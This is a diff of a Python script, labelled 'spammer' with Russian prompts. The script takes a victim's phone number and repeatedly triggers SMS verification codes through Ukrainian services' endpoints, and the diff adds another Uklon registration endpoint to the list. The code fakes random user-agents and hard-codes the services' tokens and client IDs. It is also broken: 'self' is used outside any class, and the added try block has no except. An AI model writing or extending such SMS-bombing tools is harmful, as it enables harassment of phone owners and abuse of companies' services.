@@ -41,7 +41,7 @@ conut = console.input('[cyan]Выберите вашу страну:\n[red][1] -
 
 console.print("[purple]Введите номер телефонa (без +): ")
 
-number = console.input("[blue]spammer>> ")
+self.formatted_phone = console.input("[blue]spammer>> ")
 
 run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
 
@@ -49,13 +49,15 @@ def ukr():
         for _ in track(range(run)):
                 headers = {"User-Agent": fake_useragent.UserAgent().random}
                 try:
-                         requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers)
+                         requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + self.formatted_phone, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
                 except:
                         pass
                 try:
-                         requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": number})
+                         requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.formatted_phone})
                 except:
                         pass
+                try:
+                         requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.formatted_phone})
 
 
 
